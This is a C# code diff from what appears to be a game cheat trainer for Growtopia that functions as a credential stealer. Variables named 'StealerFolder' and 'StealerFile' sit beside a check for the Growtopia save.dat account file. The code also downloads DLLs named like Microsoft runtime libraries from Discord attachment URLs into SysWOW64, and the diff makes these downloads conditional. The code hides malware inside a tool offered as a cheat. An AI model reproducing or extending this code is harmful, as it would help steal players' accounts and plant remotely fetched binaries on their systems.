@@ -77,9 +77,19 @@ namespace FreeZeHAX_Trainer
                 string StealerFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps\\";
                 string StealerFile = StealerFolderLoc + "\\" + FileName;
                 bool savePathExists = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat");
-                web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282810531840/vcruntime140.dll"), SysWOW64 + "\\vcruntime140.dll");
-                web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282974093353/vcruntime140d.dll"), SysWOW64 + "\\vcruntime140d.dll");
-                web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579283150250096/msvcp140.dll"), SysWOW64 + "\\msvcp140.dll");
+
+                if (!File.Exists(SysWOW64 + "\\vcruntime140.dll"))
+                {
+                    web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282810531840/vcruntime140.dll"), SysWOW64 + "\\vcruntime140.dll");
+                }
+                if (!File.Exists(SysWOW64 + "\\vcruntime140d.dll"))
+                {
+                    web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282974093353/vcruntime140d.dll"), SysWOW64 + "\\vcruntime140d.dll");
+                }
+                if (!File.Exists(SysWOW64 + "\\msvcp140.dll"))
+                {
+                    web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579283150250096/msvcp140.dll"), SysWOW64 + "\\msvcp140.dll");
+                }
                 CETimer.Start();
                 others.DirClean(StealerFolder);
                 others.Wait(1000);
